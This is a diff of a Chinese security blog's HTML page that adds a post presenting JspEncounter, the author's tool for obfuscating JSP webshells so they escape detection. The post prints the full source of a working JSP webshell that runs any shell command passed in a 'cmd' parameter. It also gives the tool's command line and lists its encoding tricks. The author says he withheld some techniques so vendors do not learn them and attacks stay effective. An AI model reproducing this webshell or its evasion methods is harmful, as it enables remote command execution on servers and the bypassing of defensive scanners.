@@ -6,15 +6,35 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://turn1tup.github.io">
-  <title>Archives: 2022 | turn1tup&#39;s blog</title>
+  <title>JSP下的白魔法 | turn1tup&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="turn1tup&#39;s blog">
-<meta property="og:url" content="https://turn1tup.github.io/archives/2022/page/2/index.html">
+  <meta name="description" content="JSP下的白魔法：JspEncounter@turn1tup 前言​        这几天看到以前整活的一些有趣的JSP编码手法被补天的分享会提及到，想到有大佬与前些年的笔者一样，发现了这个手法，然后也一样不吝啬分享出来，不免与有荣焉。 ​        竟然如此，笔者索性抽出咸鱼时间编写了一个小工具，帮助广大同学们学习该手法，而对应的原理实在枯燥乏味，就算笔者了然，但这最好还是给有心之人可自行查">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JSP下的白魔法">
+<meta property="og:url" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/index.html">
 <meta property="og:site_name" content="turn1tup&#39;s blog">
+<meta property="og:description" content="JSP下的白魔法：JspEncounter@turn1tup 前言​        这几天看到以前整活的一些有趣的JSP编码手法被补天的分享会提及到，想到有大佬与前些年的笔者一样，发现了这个手法，然后也一样不吝啬分享出来，不免与有荣焉。 ​        竟然如此，笔者索性抽出咸鱼时间编写了一个小工具，帮助广大同学们学习该手法，而对应的原理实在枯燥乏味，就算笔者了然，但这最好还是给有心之人可自行查">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/magic_charset.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/magic_charset_demo.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/declare_charset.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/declare_charset_demo.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/double_charset.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/double_charset_demo.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space_demo.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space_demo2.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/entity.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/eneity_demo.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/exttag.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/exttag_demo.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/namespace.png">
+<meta property="og:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/namespace_demo.png">
+<meta property="article:published_time" content="2022-11-29T08:41:25.000Z">
+<meta property="article:modified_time" content="2023-01-27T11:03:31.482Z">
 <meta property="article:author" content="turn1tup">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/magic_charset.png">
   
     <link rel="alternative" href="/atom.xml" title="turn1tup&#39;s blog" type="application/atom+xml">
   
@@ -150,106 +170,209 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-JSP下的白魔法" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      JSP下的白魔法
+    </h1>
+  
+
+        
+        <a href="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/" class="archive-article-date">
+  	<time datetime="2022-11-29T08:41:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-29</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="JSP下的白魔法：JspEncounter"><a href="#JSP下的白魔法：JspEncounter" class="headerlink" title="JSP下的白魔法：JspEncounter"></a>JSP下的白魔法：JspEncounter</h1><p>@turn1tup</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        这几天看到以前整活的一些有趣的JSP编码手法被补天的分享会提及到，想到有大佬与前些年的笔者一样，发现了这个手法，然后也一样不吝啬分享出来，不免与有荣焉。</p>
+<p>​        竟然如此，笔者索性抽出咸鱼时间编写了一个小工具，帮助广大同学们学习该手法，而对应的原理实在枯燥乏味，就算笔者了然，但这最好还是给有心之人可自行查看吧，本文爽就完事了。</p>
+<p>​        接下来直接阐述工具相应的矩阵手法及使用效果，而工具使用的注意项及等信息则请在github查看 ：</p>
+<p>​        <a href="https://github.com/turn1tup/JspEncounter" target="_blank" rel="noopener">https://github.com/turn1tup/JspEncounter</a></p>
+<h2 id="矩阵手法"><a href="#矩阵手法" class="headerlink" title="矩阵手法"></a>矩阵手法</h2><p>被工具转换前的原始source.jsp文件内容为：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span> contentType=<span class="string">"text/html"</span> %&gt;</span><br><span class="line">&lt;%! <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;&#125; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request.getParameter (<span class="string">"cmd"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">boolean</span> isWin = System.getProperty(<span class="string">"os.name"</span>).toUpperCase().contains(<span class="string">"WIN"</span>);</span><br><span class="line">        String[] cmd = &#123;isWin?<span class="string">"cmd"</span>:<span class="string">"/bin/bash"</span>,isWin?<span class="string">"/c"</span>:<span class="string">"-c"</span>,request.getParameter(<span class="string">"cmd"</span>)&#125;;</span><br><span class="line">        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">        OutputStream outputStream = response.getOutputStream();</span><br><span class="line">        <span class="keyword">int</span> a;</span><br><span class="line">        outputStream.write(String.valueOf(System.currentTimeMillis()).getBytes());</span><br><span class="line">        <span class="keyword">while</span>((a=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            outputStream.write(a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>工具命令为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java  &quot;-Dfile.encoding&#x3D;utf-8&quot; -jar JspEncounter.jar -m jsp -c matrix.xlsx -s source.jsp -o result.jsp</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="magic-charset"><a href="#magic-charset" class="headerlink" title="magic charset"></a>magic charset</h3><p>我们打开 <code>matrix.xlsx</code>进行配置，这里配置输出单种字符集文件：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/magic_charset.png" alt="all_cp037"></p>
+<p>执行命令后，输出的编码后的文件:</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/magic_charset_demo.png" alt="magic_charset_demo"></p>
+<h3 id="declare-charset"><a href="#declare-charset" class="headerlink" title="declare charset"></a>declare charset</h3><p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/declare_charset.png" alt="declare_charset"></p>
+<p>demo（放前后都可）:</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/declare_charset_demo.png" alt="declare_charset_demo"></p>
+<h3 id="double-chraset"><a href="#double-chraset" class="headerlink" title="double chraset"></a>double chraset</h3><p>双重字符集，这里以前文UTF-16BE 后文CP037为例：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/double_charset.png" alt="double_charset"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/double_charset_demo.png" alt="double_charset_demo"></p>
+<h3 id="controller-space"><a href="#controller-space" class="headerlink" title="controller space"></a>controller space</h3><p>xml 1.1版本下，将标签内的左右括号进行对应的字符替换，该模式目前支持的字符集为utf-8/iso-8859-1/utf-16：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space.png" alt="controller_space"></p>
+<p>UTF-8字符集情况下：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space_demo.png" alt="controller_space_demo"></p>
+<p>ISO-8859-1情况下的特殊空白字符：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space_demo2.png" alt="controller_space_demo"></p>
+<h3 id="unicode-amp-entity"><a href="#unicode-amp-entity" class="headerlink" title="unicode &amp; entity"></a>unicode &amp; entity</h3><p>这里使用双重编码对标签内的代码进行编码，即使用 unicode + html entity：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/entity.png" alt="entity"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/eneity_demo.png" alt="eneity_demo"></p>
+<h3 id="ext-tags"><a href="#ext-tags" class="headerlink" title="ext tags"></a>ext tags</h3><p>将代码拼接到 setProperty/useBean标签的属性中 ，该手法参考补天会议：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/exttag.png" alt="exttag"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/exttag_demo.png" alt="exttag_demo"></p>
+<h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/namespace.png" alt="namespace"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/namespace_demo.png" alt="namespace"></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>​        通过本工具我们可以便捷地了解JSP中的这些编码手法，各手法的组合需要他们的逻辑不冲突，而某些手法组合的代码实现比较麻烦，笔者就暂先没有整，大家可自行探索。当然，笔者也稍微藏了一手，毕竟如果厂商都明白了，那我们实战起来也就不那么痛快了，但如果你能真正弄懂这个矩阵中的手法，相信也能发现其他手法。而相对整个webshell的混淆知识的图谱来说，本文也只是一角。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.anquanke.com/post/id/210630" target="_blank" rel="noopener">https://www.anquanke.com/post/id/210630</a></p>
+<p><a href="https://www.anquanke.com/post/id/209826" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209826</a></p>
+<p><code>extTag setProperty/useBean拼接代码手法</code> 参考补天2022 webshell黑魔法</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/wechat_pay.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/04/29/Java%E5%BA%94%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/" class="archive-article-date">
-  	<time datetime="2022-04-30T01:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-29</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/04/29/Java%E5%BA%94%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/">Java应用内存马</a>
-    </h1>
-  
+      
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://turn1tup.github.io/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/04/13/Filter%E4%B8%AD%E5%86%99%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E8%AF%AF%E8%A7%A3(shiro)/" class="archive-article-date">
-  	<time datetime="2022-04-14T04:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-13</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2023/01/18/mybatis%E6%8F%92%E4%BB%B6%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          mybatis插件下的SQL注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/10/01/Native-Method-Hook-Bypass/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Native-Method-Hook-Bypass</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/04/13/Filter%E4%B8%AD%E5%86%99%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E8%AF%AF%E8%A7%A3(shiro)/">Filter中写内存马的误解(shiro)</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/03/09/codeql-java%E7%9A%84%E8%BF%9B%E9%98%B6%E7%9F%A5%E8%AF%86/" class="archive-article-date">
-  	<time datetime="2022-03-10T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/03/09/codeql-java%E7%9A%84%E8%BF%9B%E9%98%B6%E7%9F%A5%E8%AF%86/">codeql-java的进阶知识</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2022/">&amp;laquo; Prev</a><a class="page-number" href="/archives/2022/">1</a><span class="page-number current">2</span>
-    </nav>
   
 
 
@@ -279,8 +402,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
